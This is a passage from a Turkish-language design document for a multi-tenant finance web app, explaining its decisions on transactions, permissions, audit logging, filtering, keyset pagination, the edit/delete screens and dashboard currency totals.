- **Kullanımda olan kategori silinebilir**; bağlı işlemler silinmez, `categoryId`leri `null`a
  düşer (`onDelete: SetNull`). Hesap paranın kendisidir, kategori yalnızca bir **etikettir**;
  tek bir eski işlem yüzünden artık kullanılmayan bir etiketi listede sonsuza dek tutmaya
  zorlamak kullanıcıyı "Kullanılmıyor - silmeyin" gibi kaçamak isimlere iterdi. Kaybedilen şey
  geri alınamaz bir finansal kayıt değil, bir sınıflandırmadır ve silme audit log'a yazılır.

`Restrict` DEĞİL `NoAction` seçilmesi bir ayrıntı değil: ikisi de aynı engeli koyar, ama
Postgres'te `RESTRICT` kontrolü **ertelenemez**. Tenant silindiğinde tenant→account ve
tenant→transaction cascade'leri aynı ifadede çalışır; `RESTRICT` bu meşru silmeyi de hatayla
keserdi. `NO ACTION` kontrolü ifade sonunda yapar. Bu, varsayım değil ölçümdür ve
`integration/transaction.spec.ts`'teki cascade testiyle korunur.

### `occurredAt` ile `createdAt` ayrı alanlardır

`occurredAt` işlemin **gerçekleştiği**, `createdAt` kaydın **sisteme girildiği** andır; geçmişe
dönük kayıt girmek normaldir. İstemci göndermezse "şimdi" varsayılır (işlem formunun doğal
varsayılanı bugündür).

Doğrulama `YYYY-MM-DD` veya tam ISO 8601 kabul eder ve takvim kontrolünü **elle** yapar: bu
kontrol `new Date()`e bırakılamaz, çünkü JavaScript `"2026-02-31"`i hataya çevirmez, sessizce
3 Mart'a **taşır** — yani kullanıcının yazdığından farklı bir tarih kaydedilirdi.

**Gelecek tarih serbesttir** (ileri tarihli çek/planlı ödeme meşrudur). Bilinen sonucu, böyle bir
kaydın bakiyeyi hemen etkilemesidir; "bekleyen işlem" ayrımı ayrı bir issue'nun konusudur.

### Yetki: MEMBER okur, kaydedemez

`VIEW_TRANSACTIONS` ile `MANAGE_TRANSACTIONS` ayrıdır. MEMBER işlemleri **görür** ama
kaydedemez/düzeltemez/silemez; ADMIN ve OWNER yönetir.

Bu, matristeki **en tartışmaya açık** karardır ve bilerek dar tarafta bırakılmıştır. Gerekçe
matrisin kendi mantığından gelir: `MANAGE_ACCOUNTS` MEMBER'dan esirgenirken sebep olarak
"bakiyeyi elle değiştirmek yönetim işidir" yazılmıştı — bir işlem kaydetmek de tam olarak
bakiyeyi değiştirmektir. Karşı argüman da gerçektir: gideri fişi elinde olan kişi girer ve bu
kural MEMBER rolünü günlük akışta işlevsiz bırakır.

Dar taraf seçildi çünkü **yön asimetriktir**: yetkiyi sonradan genişletmek geriye dönük bir
sorun yaratmaz, daraltmak ise o güne kadar girilmiş kayıtları tartışmalı hâle getirir. Karar
ürün tarafından değiştirilirse tek satırlık bir matris değişikliğidir
(`src/lib/authz/permissions.ts`) ve `integration/permissions.spec.ts` ile
`security/transaction-security.spec.ts`'teki karşılıkları güncellenmelidir.

### Audit

`TRANSACTION_CREATED` / `TRANSACTION_UPDATED` / `TRANSACTION_DELETED`. Metadata **tutarı
taşımaz** (`Account`/`Category` ile aynı karar): audit log finansal tutarların ikinci bir
kopyası değil, "kim, ne zaman, hangi hesapta" sorusunun yanıtıdır. Güncellemede yalnızca hangi
alanların değiştiği kaydedilir.

### Bilinen sınırlar

- **Liste sayfalanmaz.** Filtreleme/arama #56 ile geldi (aşağıya bakın), ama **sayfalama
  gelmedi**: #56'nın kapsamında yoktu ve ayrı bir issue gerektiriyor. Sıralama yine de
  deterministiktir (önce `occurredAt`, eşitlikte `createdAt`) — aksi hâlde sayfalama
  eklendiğinde satır atlayan bir liste doğardı.
- **Hesaplar arası transfer yoktur.** Bugün bir transfer, iki ayrı işlem olarak girilir; tek
  kayıtta iki hesabı etkileyen bir "transfer" türü ayrı bir modelleme kararıdır.
- **Tekrarlayan işlemler ve toplu import** issue'da açıkça kapsam dışıdır (Epic 10).
- **`Decimal(19, 4)` taşması** (bakiyenin 15 basamağı aşması) uygulama katmanında yakalanmaz;
  Postgres hata verir. Gerçekçi olmayan bir sınır olduğu için önden kontrol yazılmadı.

Arayüz (`/transactions`) #54'ün konusudur.

### İşlem ekranı (Issue #54)

`/transactions` (`src/app/(app)/transactions/`). Aktif çalışma alanının işlemlerini listeler ve
yetkili role kayıt formunu gösterir. `/accounts` (#47) ve `/categories` (#50) ile aynı desen:
URL'de `tenantId` yoktur, kaynak aktif tenant'tır; form servis fonksiyonunu değil
`POST /api/.../transactions`'ı çağırır. Kabuktaki (#39) "İşlemler" menü öğesi artık gerçek bir
link.

Önceki iki ekrandan farkı: bu sayfa **üç** liste okur (işlemler, hesaplar, kategoriler). API
bilerek ilişki genişletmez (dar `select` allowlist'i), bu yüzden listedeki `accountId` /
`categoryId` alanlarını okunabilir isme çevirmek için hesap ve kategori listeleri de gerekir —
zaten formun açılır menüleri için okunuyorlar. Üçü `Promise.all` ile paralel çekilir.

- **Kategori seçicisi türe göre İSTEMCİDE süzülür**, API'nin `?type` filtresiyle (#49) değil.
  Sayfa kategorilerin tamamını zaten listeyi çizmek için okumuş durumda; her tür değişiminde
  ikinci bir istek atmak gereksiz gecikme ve ek bir hata durumu getirirdi. Filtre yine de ölü
  değil: kategori listesi uzayıp seçici aramalı/asenkron hâle geldiğinde doğal kullanıcısı o
  olacak. **Asıl koruma sunucuda:** uyumsuz bir kategori gönderilse backend `400` döner.
- **Tür değişince kategori seçimi temizlenir.** Aksi hâlde seçim, artık listede görünmeyen ama
  state'te duran bir kategoriye takılı kalır; kullanıcı "Gelir" seçtiği hâlde gizli bir gider
  kategorisiyle kaydetmeye çalışır ve sebebi ekranda görünmeyen bir `400` alırdı.
- **Tutar alanı `type="text"` + `inputMode="decimal"`, `type="number"` DEĞİL.** `type="number"`
  tarayıcı/yerel ayara göre virgüllü girdiyi kabul edip değeri **boş string** olarak geri
  verebilir; kullanıcının yazdığı tutar sessizce kaybolurdu. API sözleşmesi zaten string bekler
  (invariant #10), alanın yazılanı birebir taşıması gerekir. `inputMode` mobilde sayısal klavyeyi
  yine de açar.
- **Tarihin varsayılanı sunucudan prop olarak gelir**, istemcide `new Date()` ile
  hesaplanmaz. İki nedeni var: istemcide hesaplanan değer sunucu render'ıyla uyuşmazsa (sunucu
  ile tarayıcının saat dilimi farklıysa, gece yarısı civarında) **hydration uyuşmazlığı** doğar;
  ve "şimdi"nin kaynağı bu üründe zaten sunucudur (`@default(now())`), ikinci bir zaman kaynağı
  iki farklı "bugün" üretirdi.
- **Liste tarihleri `YYYY-MM-DD` olarak, `toLocaleDateString()` KULLANILMADAN yazılır.**
  Yerelleştirme çıktıyı sunucunun saat dilimine ve locale'ine bağlardı; aynı kayıt geliştirme ve
  CI ortamında farklı görünebilirdi. **Bilinen sınır:** kullanıcı başına saat dilimi yönetimi bu
  üründe hiç yok ve ayrı bir issue gerektirir.
- **Tutarlar ham string olarak gösterilir**, `Intl.NumberFormat` ile değil — hesap ekranındaki
  (#47) aynı karar ve aynı gerekçe (invariant #10).
- **Hesap yoksa form yerine yönlendirme gösterilir.** İşlem hesapsız kaydedilemez (`accountId`
  zorunlu); boş bir hesap seçicisi göstermek kullanıcıyı kesin bir hataya sürüklerdi.
- **Kategorisi silinmiş işlem listede "Kategorisiz" yazar** (boş hücre değil) — #53'ün
  `onDelete: SetNull` kararının arayüzdeki karşılığı.
- **Başarılı kayıttan sonra tutar ve açıklama temizlenir; hesap, tür ve tarih korunur.**
  Kullanıcı genellikle aynı günün fişlerini aynı hesaba arka arkaya girer.
- **Kapsam:** liste + kayıt. Güncelleme/silme arayüzü bu issue'da bilerek yapılmadı; üç ekran
  birlikte #130'da ele alındı. Arama/filtreleme #56'dır.

E2E kanıtı: `e2e/transactions-ui.spec.ts` — her sonuç bağımsız bir okumayla doğrulanır ve bu
ekrana özgü ek iddia ayrıca kontrol edilir: bir işlem kaydetmek yalnızca satır eklemez,
**hesabın bakiyesini** değiştirir. Başarılı kayıtta bakiyenin doğru yönde değiştiği, geçersiz
girdide ise ne kaydın ne bakiyenin değiştiği `GET /api/tenants/:id/accounts` ile kanıtlanır.
MEMBER için formun hiç render edilmediği ve baypas edilirse `403` alınıp bakiyenin sabit kaldığı
da test edilir.

Bir tuzak notlandı: gönder düğmesi tam adıyla (`"İşlem kaydet"`) aranır, büyük/küçük harf
duyarsız bir regex ile değil — JavaScript'te `"İ".toLowerCase()` sonucu `"i"` değil birleşik
noktalı `"i̇"`dir, dolayısıyla `/işlem kaydet/i` metni hiç eşleştirmez ve test, düğme ekranda
dururken zaman aşımına düşer.

### İşlem filtreleme ve arama (Issue #56)

`GET /api/tenants/[tenantId]/transactions?from=&to=&accountId=&categoryId=&q=` ve
`/transactions` ekranındaki filtre formu. Filtreler `AND` ile birleşir; verilmeyen alan
filtrelemez.

#### Filtre durumu URL'de, React state'inde değil

Filtre formu bir **client component değildir** — düz bir `<form method="get">` alanları URL'e
yazar ve sunucu bileşenini yeni `searchParams` ile yeniden çalıştırır. Kazandırdıkları:
sonuç paylaşılabilir ve yer imine eklenebilir, tarayıcı geri tuşu doğru çalışır, hiç istemci
JavaScript'i gerekmez. Alternatif (`useState` + `router.push`) aynı sonucu daha fazla kodla ve
hydration'a bağımlı olarak verirdi. Filtreleme bir okuma işlemidir; `GET` yan etkisiz kalır
(invariant #4).

#### Ayrıştırıcı API ile ekran arasında ORTAK

`src/lib/finance/transaction-filters.ts` hem route hem sayfa tarafından kullanılır ve HTTP
bilmez (parametreyi nasıl okuyacağını çağıran söyler). İki ayrı kopya yazmak, iki ayrı davranış
demek olurdu: bir gün API'nin reddettiği bir değeri ekran kabul eder ve **aynı URL iki farklı
sonuç** verirdi.

#### `to` kullanıcı için dahildir, sorguda değil

"15 Mart'a kadar" 15 Mart'ı da kapsar. Ama `occurredAt` bir `DateTime`tir: `lte: 2026-03-15T00:00:00Z`
yazmak o gün saat 10:00'da kaydedilmiş bir işlemi **dışarıda bırakırdı** ve kullanıcının gördüğü
listeyle filtre sonucu sessizce ayrışırdı. Üst sınır bu yüzden **ertesi günün başlangıcına `lt`**
olarak uygulanır. Hem integration hem E2E'de bu sınır ayrıca test edilir.

#### `from`/`to` yalnızca `YYYY-MM-DD`, tarih-saat kabul edilmez

Aralık filtresi takvimsel bir kavramdır; saat kabul etmek `to` için "o ana kadar mı, o günün
sonuna kadar mı" belirsizliğini doğurur, yani aynı parametreye iki anlam yüklerdi. Takvim
kontrolü yine elle yapılır (`"2026-02-31"` JavaScript'te hata değil, sessiz bir taşımadır).

#### Geçersiz filtre `400`, ama bilinmeyen id hata değil

`Category`nin `?type` kararıyla (#49) aynı çizgi — **fakat sınırı bilinçli olarak farklı**:
geçersiz bir filtreyi yok saymanın tehlikesi, listeyi **sessizce genişletmesidir**. Bu yüzden
bozuk tarih, ters aralık (`from > to`), çok uzun `q` ve **tekrarlanan parametre**
(`?q=a&q=b` — ilk değeri sessizce seçmek kullanıcının istemediği listeyi doğruymuş gibi
gösterirdi) `400` alır.

Biçimsel olarak geçerli ama **tanınmayan** bir `accountId`/`categoryId` ise hata değildir:
listeyi daraltır, genişletmez. Arama zaten tenant içinde yapıldığı için yabancı bir id hiçbir
satırla eşleşmez ve boş sonuç hiçbir şey sızdırmaz.

Ekranda geçersiz filtre, **liste hiç gösterilmeden** bir hata mesajına düşer. Filtreyi yok
sayıp tüm listeyi göstermek, filtrenin uygulandığını sanan kullanıcıya yanlış bir veri kümesini
doğruymuş gibi sunmak olurdu.

#### İki boş durum ayrı cümlelerdir

"Henüz işlem yok" ile "bu filtreyle eşleşen işlem yok" farklı şeylerdir; ikincisinde kullanıcıya
"ilkini kaydedin" demek, elindeki kayıtları yok saymak olurdu.

#### Erişilebilirlik: iki form aynı sayfada

Kayıt ve filtre formları `"Hesap"`, `"Kategori"` gibi **aynı etiketleri paylaşıyor**. İkisine de
`aria-label` verildi (`"Yeni işlem"` / `"İşlem filtreleri"`): ekran okuyucu kullanıcısı hangi
formda olduğunu ayırt edebilsin diye. E2E testleri de alanları bu adla kapsamlandırır — aksi
hâlde `getByLabel("Tarih")` filtre formundaki "Başlangıç tarihi"ne de alt dize olarak uyar ve
locator iki öğeye birden eşleşir.

#### Bilinen sınırlar

- **`description` üzerinde index yoktur**; `q` araması tarama yapar. Tenant başına işlem sayısı
  büyüdüğünde bir trigram index gerekecek — bugün eklemek, ölçülmemiş bir maliyeti şemaya
  yazmak olurdu.
- **Sayfalama bu issue'nun kapsamında değildi**; #135'te keyset imleciyle eklendi (bkz.
  "İşlem listesi sayfalama").
- **Tutara veya türe göre filtre yok** (issue'da istenmedi). Kategori filtresi dolaylı olarak
  tür ayrımı sağlar.
- **"Kategorisiz" işlemleri filtreleme yolu yok**: bunun için `categoryId` parametresine
  `none` gibi sihirli bir değer gerekirdi ve id alanına anlam yüklemek ayrı bir tasarım kararı.

E2E kanıtı: `e2e/transactions-ui.spec.ts` — her filtre ayrı ayrı, birlikte ve URL'e yazıldığı
doğrulanır; sonuç ayrıca API'den bağımsız olarak okunur. Geçersiz filtrede listenin hiç
gösterilmediği ve düzeltilince geri geldiği (duyarlılık) ayrıca test edilir.

## Düzenleme ve silme arayüzü (Issue #130)

Hesap, kategori ve işlem ekranlarına düzenleme ve silme eklendi. Bu issue **yalnızca arayüzdür**:
üç modelin de `PATCH`/`DELETE` route'ları (#46, #49, #53) zaten vardı ve dokunulmadı. Bu yüzden
yeni bir yetkilendirme ya da izolasyon kararı yok; aşağıdakiler bu üç API'nin davranışını
kullanıcıya nasıl gösterdiğimizin kararlarıdır.

### Düzenleme durumu URL'de: `?edit=<id>`

"Hangi kaydı düzenliyorum" bilgisi React state'inde değil URL'de tutulur — #56'nın filtre
kararıyla aynı gerekçe: tarayıcının geri tuşu ve sayfa yenileme kendiliğinden doğru çalışır,
düzenleme ekranının linki paylaşılabilir. Alternatif (satır içi açılan bir modal) her yenilemede
durumu kaybederdi.

**Düzenlenecek kayıt ayrı bir sorguyla ÇEKİLMEZ, listeden seçilir.** Liste zaten aktif tenant
ile scope'lanmış geldiği için, URL'e başka bir tenant'ın kaydının id'sini yazmak hiçbir şey
açmaz: eşleşme bulunamaz ve normal liste görünür. Bu, arayüzde ikinci bir "id ile getir"
sorgusu yazma ihtiyacını — ve onunla birlikte gelen tenant-scope hatası yapma riskini —
tümüyle ortadan kaldırır. Yan etkisi işlem ekranında görünür: aktif filtrenin dışında kalan bir
kayıt düzenlenemez. Kabul edildi, çünkü o kayıt zaten ekranda değildir.

### Oluşturma ve düzenleme AYNI form bileşenidir

`CreateAccountForm` → `AccountForm` (aynısı kategori ve işlem için). Ayrı bir `EditXForm`
yazmak, alanları ve doğrulama mesajlarını neredeyse birebir kopyalamak olurdu; ayrışan tek şey
hedef URL, HTTP verb'ü, düğme metni ve başarı sonrası davranıştır. Formlar birbirinden hâlâ
ayrıdır (üç model, üç farklı alan kümesi) — paylaşılan tek şey silme davranışıdır
(`src/components/delete-with-confirm.tsx`), çünkü o üçünde de birebir aynıdır.

React'e `key` verilmesi zorunludur: bir kaydı düzenlerken listeden başkasına geçildiğinde
bileşen yeniden kurulmalı, aksi hâlde önceki kaydın değerleri state'te kalır ve kullanıcı yanlış
kaydın verisini görür.

### Düzenleme formunda hesap BAKİYESİ yoktur

#53'ten beri `Account.balance` işlemlerden türetilir. Düzenleme formunda elle bakiye alanı
açmak, kullanıcıyı "bakiye = işlemlerin etkisi" invariant'ını sessizce bozmaya davet ederdi;
bakiyeyi değiştirmenin doğru yolu bir işlem kaydetmektir. Açılışta alanın olması çelişki değil:
orada bakiye türetilen değil **başlangıç noktasıdır**.

**Bilinen sınır:** API `PATCH /accounts/:id` hâlâ `balance` alanını kabul ediyor. Arayüz onu
göndermez, ama bu bir kapı değil perdedir — invariant'ı gerçekten korumak için alanın route
seviyesinde reddedilmesi gerekir ve bu, API sözleşmesini değiştirdiği için ayrı bir issue'dur.

### Onay `window.confirm()` DEĞİL, satır içi iki adım

Tarayıcının diyaloğu stillenemez, ekran okuyucuda bağlam taşımaz ve en önemlisi silmenin
**sonucunu** anlatacak yer bırakmaz. Üç ekranda sonuç birbirinden farklıdır ve kullanıcı bunu
onaylamadan **önce** görmelidir:

| Ekran | Onayda söylenen | Dayandığı karar |
| --- | --- | --- |
| Hesap | "Bu işlem geri alınamaz." + 409 gelirse ne yapılacağı | #53: işlemi olan hesap silinemez, cascade reddedildi |
| Kategori | "Bu kategoriyi kullanan işlemler silinmez, 'Kategorisiz' kalır." | #53: `onDelete: SetNull` |
| İşlem | "<hesap> bakiyesi bu işlemin etkisi geri alınarak güncellenecek." | #53: silme, bakiye etkisini geri alır |

Hesabın 409'u kullanıcıya ham hâliyle değil, **ne yapması gerektiği** söylenerek gösterilir
("önce işlemleri silin veya başka bir hesaba taşıyın"). Kategoride 409 yoktur — orada engel
olmadığı için uyarı metni tek korumadır.

### Silme bir düğmedir, link değil; `DELETE` verb'ü kullanılır

Silme state değiştirir; `GET` yan etkisiz kalmalıdır (invariant #4). Bir link, tarayıcı
ön-getirmesi veya bir crawler tarafından tetiklenebilirdi. HTML formları yalnızca `GET`/`POST`
gönderebildiği için silme, en küçük yaprakta bir client component'tir. Düzenleme ise gerçekten
bir linktir: yalnızca URL'e durum yazar, yan etkisi yoktur.

Hata durumunda onay paneli **açık kalır** — kapatmak, hatanın listedeki hangi satıra ait
olduğunu belirsizleştirirdi.

### Erişilebilir ad, görünen metinden uzundur

Listede onlarca "Sil" ve "Düzenle" düğmesi olur. Görünen metin kısadır (`aria-hidden`), yanında
`sr-only` bir ad taşınır ("Kasa hesabını sil"): ekran okuyucu kullanıcısı hangi satırda olduğunu
bilmeden silme onayına giremez.

### Yetki

Düzenle/sil aksiyonları yalnızca ilgili `MANAGE_*` iznine sahip role render edilir. Formlarda
olduğu gibi bu bir güvenlik kontrolü **değildir** — asıl kontrol route'taki
`requirePermission()`'dır; buradaki amaç MEMBER'a kesin `403` alacağı bir düğme göstermemektir.
E2E testleri her üç ekranda hem aksiyonların render edilmediğini hem de arayüz baypas edilip
endpoint doğrudan çağrıldığında `403` alındığını (işlem ekranında ayrıca bakiyenin sabit
kaldığını) doğrular — kontrol grubu ve duyarlılık kanıtı.

### 404 mesajı ayrım yapmaz

"Kayıt silinmiş" ile "başka tenant'ın kaydı" backend'de aynı `404`'ü döner (enumeration engeli).
Arayüz mesajı da ayrım yapmaz: "Bu kayıt artık mevcut değil. Sayfayı yenileyin." Mesajı
zenginleştirmek, backend'in kapattığı sızıntıyı arayüzden geri açardı.

E2E kanıtı: `e2e/accounts-ui.spec.ts`, `e2e/categories-ui.spec.ts`, `e2e/transactions-ui.spec.ts`
— her sonuç ilgili `GET` API'siyle bağımsız olarak doğrulanır. Ekrana özgü iddialar ayrıca
test edilir: düzenleme formunda bakiye alanının bulunmadığı, kullanımdaki kategori silinince
işlemin **silinmeyip** kategorisiz kaldığı, işlem tutarı değişince bakiyenin düzeltildiği ve
düzenleme/vazgeçme akışının mevcut filtreleri koruduğu.

### İşlem listesi sayfalama (Issue #135)

`GET /api/tenants/[tenantId]/transactions?after=<imleç>` ve `/transactions` ekranındaki
"Sonraki sayfa" bağlantısı. Liste artık sabit boyutlu sayfalar hâlinde döner.

#### Keyset (cursor), `OFFSET` DEĞİL

Offset iki yerden birden bozulur ve ikisi de bu üründe teoriktik değil:

1. **Derin sayfa yavaşlar.** `OFFSET 10000`, Postgres'e atlanacak on bin satırı yine de
   ürettirir. İşlem sayısı zamanla yalnızca artar; maliyet sayfa derinliğiyle doğrusal büyür.
2. **Araya kayıt girince satır kayar.** Liste `occurredAt DESC` sıralıdır ve yeni kayıtlar tam
   da listenin BAŞINA düşer. Kullanıcı birinci sayfayı okurken bir işlem kaydedilirse ikinci
   sayfanın ilk satırı, birinci sayfada zaten gördüğü satır olur.

Keyset imleci son satırın sıralama anahtarını taşır ve sorgu "bu anahtardan sonrakiler" diye
devam eder. Okunan pencere mutlak bir konuma değil somut bir satıra dayandığı için araya kayıt
girmesi sonucu etkilemez. Kanıt: `integration/transaction.spec.ts` — iki sayfa arasında yeni
bir kayıt açılır ve sayfaların HİÇ kesişmediği, birlikte tüm eski kayıtları kapsadığı
doğrulanır.

#### Sıralama anahtarı üç alandır: `(occurredAt, createdAt, id)`

#53'te sıralama bilerek deterministik yapılmıştı (`occurredAt`, eşitlikte `createdAt`), ama bu
keyset için **yeterli değil**: ikisi de eşit olabilir (aynı milisaniyede iki kayıt, ör. toplu
içe aktarma) ve sıralama anahtarı kesin bir toplam sıra vermezse iki sayfanın sınırındaki satır
ya atlanır ya tekrarlanır. Bu yüzden en sona `id` eklendi.

`orderBy` ile imlecin karşılaştırma koşulu **birlikte değişmesi gereken tek bir karardır**;
ikisi de kod içinde birbirine atıfla işaretlendi.

Prisma'nın `cursor` seçeneği kullanılmadı: o benzersiz **tek** bir alan üzerinden çalışır ve çok
sütunlu bir anahtarı ifade edemez. Ham SQL de yasak (CLAUDE.md §5), bu yüzden koşul
`OR`/`AND` ile üç dallı olarak elle kuruldu.

**Testin kanıtladığı ve kanıtlamadığı şey** — dürüstlük adına ayrı yazıldı: keyset koşulundaki
üçüncü dal (`id` karşılaştırması) silinirse ilgili test kırmızıya döner (ölçüldü). `orderBy`dan
`id` düşürülürse test **yeşil kalır**, çünkü Postgres bu boyuttaki eşitlikleri kararlı bir
sırayla döndürüyor. `id` yine de `orderBy`da olmak zorundadır: ORDER BY kesin bir toplam sıra
vermezse plan değiştiğinde (index seçimi, paralel tarama, tablo büyümesi) eşitlerin sırası kayar.
Bu, testle değil ancak SQL semantiğiyle güvenceye alınabilecek bir invariant'tır.

#### İmleç opaktır ama bir güvenlik sınırı DEĞİLDİR

İmleç, `occurredAt|createdAt|id` üçlüsünün base64url kodlamasıdır. Opaklığın amacı istemcilerin
onu ayrıştırıp alanlarına bağımlı hâle gelmesini önlemektir — sıralama anahtarını değiştirmek
aksi hâlde breaking change olurdu.

Base64 şifreleme değildir ve imleç kurcalanabilir. **Buna gerek yoktur:** imleç yalnızca
"nereden devam edileceğini" söyler, hangi tenant'ın okunacağını DEĞİL. O sorunun tek kaynağı
`requirePermission()` context'idir ve sorgu her hâlükârda `tenantScoped()` içinden geçer.
Kurcalanmış bir imleç kullanıcıya yalnızca KENDİ tenant'ının listesinde başka bir pencere
gösterebilir — filtreyi elle değiştirmekten farksızdır.

`security/transaction-security.spec.ts` bunu saldırganın en güçlü malzemesiyle kanıtlar:
**başka bir tenant'ın gerçek satırından** kurulmuş, biçimsel olarak kusursuz bir imleç. İstek
`200` döner (imleç geçerlidir) ama yabancı hiçbir veri gelmez; duyarlılık kanıtı olarak aynı
kullanıcının imleçsiz isteği kendi kayıtlarını gösterir.

İmlecin çözümlenmesi **çift yönlü** doğrulanır: ISO tarih, yeniden yazıldığında girdinin birebir
aynısı olmalıdır. `new Date()` fazlasıyla hoşgörülüdür ("2026-13-45"i sessizce başka bir güne
taşır); tek yönlü kontrol, kurcalanmış bir imleci geçerli sayıp kullanıcıya sessizce yanlış bir
pencere gösterirdi.

#### Geçersiz imleç sessizce yok sayılmaz — `400`

#56'nın geçersiz filtre kararıyla aynı gerekçe: bozuk imleci yok sayıp ilk sayfayı döndürmek,
"sonraki sayfa" diyen kullanıcıya aynı listeyi vermek ve onu **listenin sonu sandırmak** olurdu.
Ekranda da liste hiç gösterilmez; kullanıcıya "ilk sayfaya dönün" bağlantısı verilir.

Hata metni iç durumu anlatmaz (hangi alanın neden bozuk olduğu ayrıştırılmaz) ve tekrarlanan
`?after=a&after=b` de `400`'dür — filtrelerdeki "tekrar hatadır" kuralı imleç için de geçerli.

#### Sayfa boyutu sabittir; toplam sayı yoktur

- **`?limit=` YOKTUR.** Ayarlanabilir bir boyut, bir doğrulama yolu ve bir üst sınır testi daha
  demektir ve bugün hiçbir çağıran istemiyor. Sabit `50`. Güvenlik testi, birinin onu
  "zararsız" diye eklemesi hâlinde kırmızıya döner — sınırsız sayfa boyutu, tek bir istekle tüm
  tabloyu çektirmenin yoludur.
- **`total` YOKTUR.** Her istekte ikinci bir `COUNT(*)` taraması demek olurdu ve bu tarama,
  filtre `description` üzerindeyse (index'siz) listenin kendisi kadar pahalıdır. Bedeli kabul
  edildi: arayüzde **sayfa numarası ve "son sayfa" gösterilemez**.

#### Arayüz: "Sonraki sayfa" bir link, durum URL'de

Her sayfanın kendi adresi vardır (`?after=`); adres paylaşılabilir ve **tarayıcı geri tuşu
önceki sayfaya döner**. Ayrı bir "Önceki sayfa" bağlantısı bu yüzden **yoktur**: geri tuşunun
zaten yaptığı işi, imleç yığınını URL'de taşıyarak tekrarlamak olurdu.

"Daha fazla yükle" deseni reddedildi: listeyi client state'e taşır, sayfa yenilenince başa döner
ve paylaşılan link ilk sayfayı gösterirdi — #56'nın "durum URL'de" çizgisinden sapardı.

İki etkileşim ayrıca çözüldü:

- **Filtre değişince `after` düşer.** Filtre formu düz bir `<form method="get">` olduğu için
  yalnızca kendi alanlarını gönderir; imleç kendiliğinden kaybolur. Bu doğru davranıştır — yeni
  bir filtre, eski listenin ortasından değil başından okunmalıdır.
- **Düzenleme bağlantısı `after`ı KORUR.** Düzenlenecek kayıt listeden seçilir (#130); imleç
  düşseydi liste ilk sayfaya döner, kayıt o listede bulunamaz ve form hiç açılmazdı.

Üçüncü bir boş liste hâli doğdu: imleç geçerli ama arkasında kayıt kalmamış (o sayfadaki
kayıtlar silinmiş ya da bağlantı eski). Ne "henüz işlem yok" ne "filtreyle eşleşen yok" doğru
olurdu; ekran bunu ayrı bir cümleyle söyler ve ilk sayfaya dönüş verir.

#### Bilinen sınırlar

- **Sayfa numarası, "son sayfa" ve toplam kayıt sayısı yok** (yukarıdaki `total` kararının
  doğrudan sonucu).
- **"Önceki sayfa" bağlantısı yok**; geri tuşu bu işi görür ama listenin ortasından bir sayfa
  geriye derin link verilemez.
- **`(tenantId, occurredAt)` index'i genişletilmedi.** Keyset sıralaması
  `(occurredAt, createdAt, id)` üzerinden yapılıyor; index yalnızca ilk sütunu karşılıyor,
  eşitlikler bellekte sıralanıyor. Bugünkü veri boyutunda ölçülmüş bir sorun yok ve index'i
  genişletmek her yazıma maliyet ekler — `description` trigram index'iyle aynı karar (#56).
- **`q` filtresi hâlâ index'siz tarama yapar**; sayfalama bunu daha az acil yapar, ortadan
  kaldırmaz.

E2E kanıtı: `e2e/transactions-ui.spec.ts` — 50 altı kayıtta bağlantının hiç görünmediği
(kontrol grubu), ikinci sayfada satırların tekrarlamadığı, son sayfada bağlantının kaybolduğu,
geri tuşunun ilk sayfaya döndüğü, sayfa geçişinin filtreleri koruduğu, filtre değişince imlecin
düştüğü ve ikinci sayfadaki bir kaydın düzenlenebildiği doğrulanır.

## Panel özeti, grafik ve onboarding (Issue #62, #63)

Panel artık gerçek bir panel: para birimi bazında bakiye, kayıt sayıları, **bu ayın**
gelir/gider/farkı, **son altı ayın** gelir-gider trendi ve son beş hareket. Hesaplama katmanı
`src/lib/finance/dashboard.ts` (`getDashboardSummary()`), HTTP yüzeyi
`GET /api/tenants/:tenantId/dashboard/summary`.

**Migration YOK.** Şemaya tek bir alan eklenmedi; özet tamamen mevcut `Account`, `Transaction`
ve `Category` kayıtlarından türetiliyor. Bir "özet tablosu" (materialized summary) reddedildi:
bugünkü veri boyutunda ölçülmüş bir sorun yok ve türetilmiş veriyi kalıcılaştırmak, kaynakla
ayrışabilen ikinci bir gerçek üretir.

### Farklı para birimleri ASLA toplanmaz

Üründe **kur dönüşümü altyapısı yok** (bkz. `Account.currency` notu). Bu yüzden panelde
"Toplam Bakiye" diye **tek bir sayı yoktur**; her para birimi kendi kartına, kendi aylık
özetine ve kendi grafiğine sahiptir. 10.000 TRY ile 500 USD'yi toplayan bir sayı, *doğru
görünen* ama anlamsız bir sayıdır — finansal bir üründe bu, hiç sayı göstermemekten kötüdür.

Kullanıcıya da söylenir: birden fazla para birimi varken bakiye başlığının yanında "Para
birimleri ayrı toplanır — kur dönüşümü yapılmaz." yazar. Sessiz bir kısıt, kullanıcının
kafasında yanlış bir toplam kurmasını engellemez.

**İşlemin para birimi kendi satırında yok:** bir `Transaction`ın para birimi, bağlı olduğu
`Account.currency`dir. Prisma `groupBy` bir *ilişki* alanına göre gruplayamaz ve ham SQL bu kod
tabanında yasak (CLAUDE.md §5) — bu yüzden gruplama `accountId` üzerinden yapılır ve para
birimine katlama uygulama katmanında `Prisma.Decimal` aritmetiğiyle tamamlanır. Toplama yine
kayıpsızdır: **hiçbir noktada `number`a dönüşülmez** (invariant #10).

Hesap → para birimi haritası, `groupBy`'lardan **sonra** okunur (paralel değil): araya yeni bir
hesap + işlem girerse işlem `groupBy`'da görünüp hesap listede olmayabilirdi ve o ayın toplamı
sessizce eksik kalırdı. Şemadaki `onDelete: NoAction` sayesinde işlemi olan bir hesap bu arada
silinemez, dolayısıyla harita yalnızca büyüyebilir.

### Dönem: UTC ay sınırları, altı aylık pencere

Ay sınırları **UTC**'dir ve üst sınır `lt` ile uygulanır (ayın son milisaniyesini `lte` ile
yakalamaya çalışmak onu kaçırırdı). Yerel saate göre ay sınırı hesaplamak, aynı işlemi
sunucunun diliminde başka bir aya düşürürdü; UTC en azından tek ve öngörülebilir bir kuraldır.
`parseFilterDate()` de aynı tercihi yapıyor. **Bilinen sınır:** saat dilimi yönetimi hâlâ yok
(#134); kullanıcı UTC+3'te ayın 1'inde gece yarısından önce girdiği bir işlemi bir önceki ayda
görebilir.

"Bu ay", trendin **son kovasıdır** — ayrı bir sorguyla hesaplanmaz. İki ayrı hesap, zamanla
"bu ayın geliri"nin iki farklı tanımına dönüşür.

`getDashboardSummary(tenantId, now)`'ın ikinci parametresi **yalnızca testler içindir**; route
ve sayfa katmanı onu hiç geçirmez. Dönem penceresi sunucunun kararıdır, istemcinin değil.

### `net` mutlak değerdir, işareti ayrı alan taşır

